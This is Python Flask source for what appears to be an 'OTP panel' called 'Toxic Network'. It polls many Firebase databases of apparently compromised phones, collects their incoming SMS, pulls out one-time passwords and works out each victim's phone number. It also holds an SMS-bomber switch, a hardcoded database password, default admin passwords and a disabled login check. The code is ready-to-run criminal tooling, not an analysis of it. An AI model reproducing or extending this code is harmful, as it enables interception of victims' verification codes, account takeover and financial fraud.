from flask import Flask, request, jsonify, session, redirect, url_for, Response
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests
import os
import re
import json
import threading
import time
import hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "toxic_otp_secret_2025_v24_1")

MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net")
BG_REFRESH_INTERVAL = 60
MESSAGE_CACHE_TTL = 10
MAX_SMS_PER_NUMBER = 60
FETCH_TIMEOUT = 10
FAST_FETCH_TIMEOUT = 10
MAX_PARALLEL = 15
MAX_DEVICES_PER_FB = 300
IST = timezone(timedelta(hours=5, minutes=30))

FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "toxic_fb_secure_salt_2025_v24")

MONGO_OK = False
mongo_client = None
db = None
fb_collection = None
settings_collection = None
sms_logs_collection = None


def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]


def init_mongo():
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, sms_logs_collection
    try:
        mongo_client = MongoClient(
            MONGO_URI,
            serverSelectionTimeoutMS=8000,
            connectTimeoutMS=8000,
            socketTimeoutMS=8000,
            maxPoolSize=50,
        )
        db = mongo_client["otp_panel"]
        fb_collection = db["firebases"]
        settings_collection = db["settings"]
        sms_logs_collection = db["sms_logs"]
        mongo_client.admin.command("ping")
        MONGO_OK = True
        print("MongoDB connected")
    except Exception as e:
        MONGO_OK = False
        print(f"MongoDB: {e}")


init_mongo()

DEFAULT_USER_PWD = "User@2025"
DEFAULT_ADMIN_PWD = "Admin@2025"


def get_pwd(role):
    if not MONGO_OK:
        return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD
    try:
        doc = settings_collection.find_one({"_id": f"{role}_password"})
        if doc and doc.get("value"):
            return doc["value"]
    except Exception:
        pass
    return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD


def set_pwd(role, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": f"{role}_password"},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception as e:
        print(f"set_pwd error: {e}")
        return False


def get_setting(key, default=None):
    if not MONGO_OK:
        return default
    try:
        doc = settings_collection.find_one({"_id": key})
        if doc is not None and "value" in doc:
            return doc["value"]
    except Exception:
        pass
    return default


def set_setting(key, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": key},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception as e:
        print(f"set_setting error: {e}")
        return False


def get_user_panel_state():
    active_str = str(get_setting("user_panel_active", "true")).lower()
    try:
        expires_at = int(get_setting("user_panel_expires_at", 0) or 0)
    except Exception:
        expires_at = 0
    passwordless_str = str(get_setting("passwordless_mode", "true")).lower()
    try:
        pl_expires_at = int(get_setting("passwordless_expires_at", 0) or 0)
    except Exception:
        pl_expires_at = 0

    bomber_active = str(get_setting("sms_bomber_active", "true")).lower() in ("true", "1", "yes")

    now = int(time.time())
    active = active_str in ("true", "1", "yes")
    if active and expires_at > 0 and now >= expires_at:
        active = False
        set_setting("user_panel_active", "false")
        set_setting("user_panel_expires_at", 0)
        expires_at = 0

    passwordless = passwordless_str in ("true", "1", "yes")
    if passwordless and pl_expires_at > 0 and now >= pl_expires_at:
        passwordless = False
        set_setting("passwordless_mode", "false")
        set_setting("passwordless_expires_at", 0)
        pl_expires_at = 0

    return {
        "active": active,
        "expires_at": expires_at if active else 0,
        "passwordless": passwordless,
        "passwordless_expires_at": pl_expires_at if passwordless else 0,
        "bomber_active": bomber_active,
        "now": now,
    }


cache = {
    "numbers_map": {},
    "devices": {},
    "device_messages": {},
    "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0,
    "loading": False,
    "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(),
    "inflight": set(),
    "inbox_locks": {},
    "otp_cache": {},
    "otp_cache_time": {},
    "fb_stats": {},
    "fb_stats_time": 0,
}

MSG_FIELDS = {"message", "body", "text", "msg", "content", "messagetext", "messagebody", "sms", "smsbody", "smscontent", "smsbodytext", "lastmessage", "fullmessage", "sms_message", "msgbody"}
TIME_FIELDS = {"timestamp", "time", "date", "receivedtime", "datetime", "createdat", "senttime", "smstime", "devicetime", "date_time", "received_time", "sent_time", "sms_time", "device_time", "smsdate", "receivedat", "sentat", "lastmessagetime", "recvtime", "logtime", "event_time"}
SENT_KEYS = {"command", "commands", "sendsms", "action", "webhookevent", "send_sms", "sentsms", "outgoing"}
INCOMING_TYPES = {"incoming", "received", "inbox", "recv", "in"}


def digits_only(s):
    return re.sub(r"\D", "", str(s) if s is not None else "")


def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d


def extract_real_numbers_from_message(message):
    if not message:
        return []
    text = str(message)
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', text)
    found = []
    seen = set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    return found


def parse_date_string(s):
    if not s or not isinstance(s, str):
        return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)", s.strip(), re.IGNORECASE)
        if not m:
            return 0
        day, month, year, hour, minute, ap = m.groups()
        hour = int(hour)
        if ap.lower() == "pm" and hour != 12:
            hour += 12
        if ap.lower() == "am" and hour == 12:
            hour = 0
        dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
        return int(dt.timestamp())
    except Exception:
        return 0


def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None:
        found = []
    if depth > 10:
        return found
    pk_lower = parent_key.lower()
    if any(k in pk_lower for k in SENT_KEYS):
        return found
    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        has_body = bool(kl & MSG_FIELDS)
        if has_body:
            def get_any(fs):
                for k in obj.keys():
                    if k.lower() in fs:
                        return obj[k]
                return None
            body = get_any(MSG_FIELDS)
            from_val = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("sender", "from", "origin", "address", "src"):
                    v = obj[k]
                    if v and isinstance(v, str) and v.strip():
                        from_val = v.strip()
                        break
            to_val = None
            for k in obj.keys():
                if k.lower() in ("to", "destination", "receiver"):
                    to_val = obj[k]
                    break
            date_str = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("datetime", "date_time", "date", "datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v
                        break
            msg_id = obj.get("id")
            ts = 0
            if date_str:
                ts = parse_date_string(date_str)
            if not ts:
                ts_raw = get_any(TIME_FIELDS)
                if ts_raw:
                    try:
                        ts = int(ts_raw)
                        if ts > 1e12:
                            ts = ts // 1000
                    except Exception:
                        ts = 0
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    if mid > 1e12:
                        ts = mid // 1000
                    elif mid > 1e9:
                        ts = mid
                except Exception:
                    pass
            if not ts:
                ts = parent_ts
            msg_type = str(obj.get("type", "")).lower().strip()
            is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = False
            if msg_type in INCOMING_TYPES:
                keep = True
            elif msg_type in ("sent", "outgoing"):
                keep = False
            elif is_sended is True:
                keep = False
            elif is_sended is False:
                keep = True
            elif from_val and not to_val:
                keep = True
            elif to_val and not from_val:
                keep = False
            elif not to_val and not from_val:
                keep = True
            else:
                keep = False
            if keep and body:
                display_from = from_val if from_val else "Unknown"
                found.append({
                    "from": str(display_from) if display_from else "Unknown",
                    "to": str(to_val) if to_val else "",
                    "message": str(body),
                    "timestamp": ts,
                    "date_string": date_str,
                    "id": msg_id,
                    "type": "received",
                })
        for k, v in obj.items():
            kl2 = k.lower()
            if any(x in kl2 for x in SENT_KEYS):
                continue
            child_ts = parent_ts
            try:
                tk = int(k)
                if tk > 1e12:
                    child_ts = tk // 1000
                elif tk > 1e9:
                    child_ts = tk
            except Exception:
                pass
            collect_all_messages(v, found, depth + 1, child_ts, k)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
    return found


def extract_otp(text):
    if not text:
        return ""
    m = re.search(r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"#(\d{4,8})", text)
    if m:
        return m.group(1)
    return ""


def is_online(info):
    if not isinstance(info, dict):
        return False
    if info.get("status") is True:
        return True
    if info.get("isOnline") is True:
        return True
    if info.get("online") is True:
        return True
    if info.get("connected") is True:
        return True
    if info.get("status") in ("online", "active", 1):
        return True
    if info.get("lastSeen"):
        try:
            ls = int(info.get("lastSeen"))
            if time.time() - ls < 600:
                return True
        except Exception:
            pass
    return False


def find_real_number_from_messages(all_msgs):
    number_counter = Counter()
    sender_numbers = set()
    for m in all_msgs:
        sender = m.get("from", "")
        if sender:
            sender_nums = extract_real_numbers_from_message(sender)
            for sn in sender_nums:
                sender_numbers.add(sn)
    for m in all_msgs:
        if m.get("type") != "received":
            continue
        msg_text = m.get("message", "")
        nums = extract_real_numbers_from_message(msg_text)
        for n in nums:
            if n in sender_numbers:
                continue
            if n.startswith(("1800", "1900", "1991")):
                continue
            number_counter[n] += 1
    return number_counter.most_common(10)


def _finalize_device(name, online, sims, msgs, dev_data):
    seen_m = set()
    unique = []
    for m in msgs:
        h = f"{m.get('from', '')}|{m.get('message', '')[:80]}|{m.get('timestamp', 0)}"
        if h in seen_m:
            continue
        seen_m.add(h)
        unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    unique = unique[:MAX_SMS_PER_NUMBER]
    per_number = {n["number"]: [] for n in sims}
    if sims:
        first_num = sims[0]["number"]
        per_number[first_num] = unique[:]
    for num in per_number:
        per_number[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per_number[num] = per_number[num][:MAX_SMS_PER_NUMBER]
    total_otp = sum(1 for m in unique if extract_otp(m.get("message", "")))
    return {
        "name": name, "online": online, "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique,
        "per_number": per_number,
        "total_msgs": len(unique), "total_otp": total_otp,
    }


_thread_local = threading.local()


def _get_session():
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0")
        _thread_local.session = s
    return _thread_local.session


def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _get_session().get(url, timeout=timeout)
        if r.status_code != 200:
            return None
        t = r.text.strip()
        if not t or t == "null":
            return None
        return json.loads(t)
    except Exception:
        return None


def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true", "/clients.json", "/devices.json?shallow=true", "/devices.json"]:
        data = try_json(base + path)
        if isinstance(data, dict):
            return list(data.keys())
    return []


def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json", f"/{dev_id}.json"]:
        data = try_json(base + p)
        if isinstance(data, dict):
            return data
    return None


def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs = []
    seen = set()
    url = f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60'
    data = try_json(url, timeout=FAST_FETCH_TIMEOUT)
    if not data:
        url = f'{base}/messages/{dev_id}.json'
        data = try_json(url, timeout=30)
    if data and isinstance(data, dict):
        msgs = collect_all_messages(data)
        for m in msgs:
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen:
                continue
            seen.add(h)
            all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]


def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    device_ids = fetch_device_ids(fb_url)
    if len(device_ids) > MAX_DEVICES_PER_FB:
        device_ids = device_ids[:MAX_DEVICES_PER_FB]
    for did in device_ids:
        raw = fetch_device_data(fb_url, did)
        if not raw:
            continue
        msgs = fetch_messages_multi_path(fb_url, did, phone_numbers=None)
        if raw:
            inner_msgs = collect_all_messages(raw)
            existing = set()
            for m in msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                existing.add(h)
            for m in inner_msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                if h not in existing:
                    msgs.append(m)
                    existing.add(h)
            msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            msgs = msgs[:MAX_SMS_PER_NUMBER]
        online = is_online(raw)
        name = did[:16]
        for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand", "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName", "hardware", "deviceBrand"]:
            v = raw.get(f) if isinstance(raw, dict) else None
            if v and isinstance(v, str) and v.strip():
                name = v.strip()[:25]
                break
                
        real_number = None
        for f in ["phoneNumber", "phone_number", "msisdn", "simSerial", "sim_serial", "number", "simNumber", "sim_number", "sender"]:
            v = raw.get(f) if isinstance(raw, dict) else None
            if v and isinstance(v, str):
                d = digits_only(v)
                if len(d) >= 10:
                    real_number = normalize_number(v)
                    break
        
        if not real_number:
            top_candidates = find_real_number_from_messages(msgs)
            if top_candidates:
                real_number = top_candidates[0][0]
                
        if real_number:
            sims = [{"slot": 0, "number": real_number, "online": online, "confidence": 99}]
        else:
            sims = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": online, "confidence": 0}]
            
        dev = _finalize_device(name, online, sims, msgs, raw)
        dev["id"] = did
        dev["firebase"] = fb_url
        dev["fb_name"] = fb_name
        dev["fb_id"] = fb_id
        out.append(dev)
    return out


def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            is_dev_online = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                if num.startswith("UNKNOWN-"):
                    key = num
                else:
                    key = normalize_number(num)
                    if not key or len(key) != 10:
                        continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num, "device_id": dev["id"], "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""), "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""), "online": is_dev_online,
                        "msg_count": len(msgs), "otp_count": otp_count,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    existing = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > existing.get("confidence", 0):
                        existing["number"] = num
                        existing["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > existing["msg_count"]:
                        existing["device_id"] = dev["id"]
                        existing["device_name"] = dev.get("name", "")
                        existing["firebase"] = dev.get("firebase", "")
                        existing["fb_id"] = dev.get("fb_id", "")
                        existing["fb_name"] = dev.get("fb_name", "")
                        existing["msg_count"] = len(msgs)
                        existing["otp_count"] = otp_count
                        existing["online"] = is_dev_online
                    elif is_dev_online and not existing["online"]:
                        existing["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        offline = len(nums) - online
        total_otp = sum(n.get("otp_count", 0) for n in nums)
        total_msg = sum(n.get("msg_count", 0) for n in nums)
        otp_rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
        cache["stats"] = {"total": len(nums), "online": online, "offline": offline, "otp_rate": otp_rate}


def fetch_fb_stats():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fb_id = str(fb.get("_id", ""))
            if not url:
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}
                return
            try:
                devices = fetch_devices_from_one_fb(url, fb.get("name", ""), fb_id)
                online = sum(1 for d in devices if d.get("online"))
                offline = len(devices) - online
                results[fb_id] = {"online": online, "offline": offline, "devices": len(devices)}
            except Exception as e:
                print(f"fb_stats worker error {url}: {e}")
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=90)

    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()


def fetch_all_devices():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(firebases)}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]:
                    cache["progress"]["done"] += 1
                return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", "")))
                merge_numbers_into_cache(devs)
            except Exception as e:
                print(f"worker error {url}: {e}")
            with cache["lock"]:
                cache["progress"]["done"] += 1

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=120)


def refresh_cache():
    with cache["lock"]:
        if cache["loading"]:
            return
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]:
            cache["last_update"] = time.time()
    except Exception as e:
        print(f"Refresh error: {e}")
    finally:
        with cache["lock"]:
            cache["loading"] = False


def bg_refresher():
    time.sleep(5)
    while True:
        try:
            refresh_cache()
        except Exception as e:
            print(f"BG: {e}")
        time.sleep(BG_REFRESH_INTERVAL)


threading.Thread(target=bg_refresher, daemon=True).start()


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        session["logged_in"] = True
        session["role"] = "user"
        if request.path.startswith("/api/"):
            return f(*args, **kwargs)
        return f(*args, **kwargs)
    return wrapper


def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in") or session.get("role") != "admin":
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*args, **kwargs)
    return wrapper


# ==================== PREMIUM CSS ====================
PREMIUM_CSS = """
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Inter',system-ui,-apple-system,sans-serif}
html,body{overscroll-behavior-y:contain;background:#0f172a;color:#f1f5f9;min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
body{padding-bottom:env(safe-area-inset-bottom)}
input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:10px;font-family:inherit;outline:none}
button{touch-action:manipulation;cursor:pointer;border:none;transition:all 0.2s ease}
a{-webkit-tap-highlight-color:transparent;text-decoration:none;color:inherit}
::selection{background:#3b82f6;color:#fff}

::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:#475569}

@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes slideUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
@keyframes slideDown{from{opacity:0;transform:translateY(-15px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}

.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
.spinner-dark{border:2px solid rgba(0,0,0,0.1);border-top-color:#3b82f6}

.pulse-dot{width:8px;height:8px;border-radius:50%;background:#10b981;animation:pulse 1.5s infinite;display:inline-block}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#1e293b;color:#fff;padding:12px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 25px rgba(0,0,0,0.5);z-index:9999;transition:transform .3s cubic-bezier(0.4,0,0.2,1);pointer-events:none;max-width:90vw;text-align:center;border:1px solid #334155}
.toast.show{transform:translateX(-50%) translateY(0)}
"""

# ==================== LOGIN PAGE (ADMIN ONLY) ====================
ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — ROOT</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#0f172a">
<style>""" + PREMIUM_CSS + """
body{display:flex;align-items:center;justify-content:center;padding:24px;background:#0f172a}
.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:36px 28px;position:relative;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
.logo{text-align:center;margin-bottom:24px}
.logo-icon{font-size:48px;margin-bottom:12px;display:block}
h1{text-align:center;font-size:20px;margin-bottom:6px;color:#f1f5f9;letter-spacing:-0.5px;font-weight:800}
p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:32px;font-weight:500}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#f1f5f9;transition:.2s;font-weight:500}
input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.15)}
input::placeholder{color:#64748b}
.toggle-pwd{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#64748b;padding:4px}
.toggle-pwd:hover{color:#f1f5f9}
button{width:100%;margin-top:20px;padding:16px;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px;cursor:pointer;transition:.2s}
button:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 10px 15px -3px rgba(59,130,246,0.3)}
button:active{transform:scale(.98)}
.err{margin-top:16px;text-align:center;color:#ef4444;font-size:13px;padding:12px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);border-radius:8px;font-weight:500}
.info{margin-top:24px;text-align:center;font-size:12px;color:#64748b;font-weight:500}</style></head><body>
<form class="box" method="POST">
<div class="logo"><span class="logo-icon">🔒</span></div>
<h1>Root Access</h1>
<p class="sub">Super Master Admin Panel</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Enter Root Key" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁</span>
</div>
<button type="submit">Authenticate</button>__ERROR__
<div class="info">Protected System · Level 99</div>
</form>
<script>
function togglePwd(e){
  var i=document.getElementById('pwd');var t=e.target;
  if(i.type==='password'){i.type='text';t.textContent='🙈';}
  else{i.type='password';t.textContent='👁';}
}
</script>
</body></html>"""


# ==================== PANEL OFFLINE PAGE ====================
PANEL_OFFLINE_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OFFLINE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta http-equiv="refresh" content="15">
<meta name="theme-color" content="#0f172a">
<style>""" + PREMIUM_CSS + """
body{display:flex;align-items:center;justify-content:center;padding:24px;background:#0f172a}
.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:40px 28px;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
.icon{font-size:64px;margin-bottom:16px;display:block;animation:pulse 2s infinite}
h1{color:#f1f5f9;font-size:22px;margin-bottom:12px;font-weight:800;letter-spacing:-0.5px}
p{color:#94a3b8;font-size:14px;margin-bottom:8px;font-weight:500}
.hint{margin-top:24px;padding:16px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);border-radius:12px;font-size:13px;color:#f87171;font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px}
.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:#ef4444;animation:pulse 1s infinite}</style></head><body>
<div class="box">
<span class="icon">🚫</span>
<h1>Access Denied</h1>
<p>User Panel Temporarily Offline</p>
<p style="font-size:12px;margin-top:12px;opacity:0.8">Administrator has deactivated the panel.</p>
<div class="hint"><span class="pulse"></span>Auto-Retry Active · 15s</div>
</div>
</body></html>"""


# ==================== USER DASHBOARD ====================
USER_DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#0f172a">
<style>""" + PREMIUM_CSS + r"""
body{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
.topbar{background:#1e293b;border-bottom:1px solid #334155;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;padding-top:calc(16px + env(safe-area-inset-top));box-shadow:0 4px 6px -1px rgba(0,0,0,0.1)}
.brand{font-size:20px;font-weight:800;letter-spacing:-0.5px;display:flex;align-items:center;gap:8px}
.brand span{color:#3b82f6}
.top-actions{display:flex;align-items:center;gap:12px}
.refresh-btn{background:#334155;color:#f1f5f9;width:40px;height:40px;border-radius:12px;font-size:18px;display:flex;align-items:center;justify-content:center;transition:.2s}
.refresh-btn:hover{background:#475569}
.refresh-btn.spinning{animation:spin 1s linear infinite}
.conn{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;padding:8px 12px;border-radius:10px;background:#0f172a;border:1px solid #334155;color:#94a3b8}
.conn.online{color:#10b981;border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
.conn.offline{color:#ef4444;border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.05)}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}

.nav{display:flex;gap:8px;padding:16px 20px 0;overflow-x:auto;scrollbar-width:none}
.nav::-webkit-scrollbar{display:none}
.nav-link{padding:10px 20px;border-radius:12px;font-size:14px;font-weight:600;color:#94a3b8;background:#1e293b;border:1px solid #334155;cursor:pointer;transition:.2s;white-space:nowrap;display:flex;align-items:center;gap:8px}
.nav-link:hover{color:#f1f5f9;border-color:#475569}
.nav-link.active{background:#3b82f6;color:#fff;border-color:#3b82f6;box-shadow:0 4px 12px rgba(59,130,246,.3)}

.container{max-width:900px;margin:0 auto;padding:20px}
.session-banner{background:linear-gradient(135deg,rgba(16,185,129,.1),rgba(59,130,246,.1));border:1px solid rgba(16,185,129,.2);border-radius:12px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:600;color:#10b981;animation:fadeIn 0.5s ease}
.session-banner.temp{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(239,68,68,.1));border-color:rgba(245,158,11,.2);color:#f59e0b}

.stats{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}
.stat{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;position:relative;overflow:hidden;transition:.3s;animation:slideUp 0.5s ease both}
.stat:nth-child(1){animation-delay:0.05s}
.stat:nth-child(2){animation-delay:0.1s}
.stat:nth-child(3){animation-delay:0.15s}
.stat:nth-child(4){animation-delay:0.2s}
.stat .label{font-size:11px;color:#94a3b8;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
.stat .value{font-size:28px;font-weight:800;letter-spacing:-1px}
.stat.total .value{color:#3b82f6}
.stat.online .value{color:#10b981}
.stat.offline .value{color:#ef4444}
.stat.otp{display:flex;flex-direction:column;justify-content:center;align-items:center}
.circular-chart{display:block;margin:0 auto;max-width:50px;max-height:50px}
.circle-bg{fill:none;stroke:#334155;stroke-width:3.8}
.circle{fill:none;stroke-width:3.8;stroke-linecap:round;stroke:#8b5cf6;transition:stroke-dasharray 1s ease-out}
.otp-text{font-size:14px;font-weight:800;fill:#f1f5f9;text-anchor:middle;dominant-baseline:middle}

.filter-bar{display:flex;gap:10px;margin-bottom:20px;background:#1e293b;padding:8px;border-radius:16px;border:1px solid #334155}
.filter-btn{flex:1;padding:10px;border-radius:10px;font-size:13px;font-weight:600;color:#94a3b8;background:transparent;transition:.2s;display:flex;align-items:center;justify-content:center;gap:6px}
.filter-btn:hover{color:#f1f5f9}
.filter-btn.active{background:#334155;color:#f1f5f9;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
.filter-btn.active.online-filter{background:rgba(16,185,129,.15);color:#10b981;border:1px solid rgba(16,185,129,.3)}
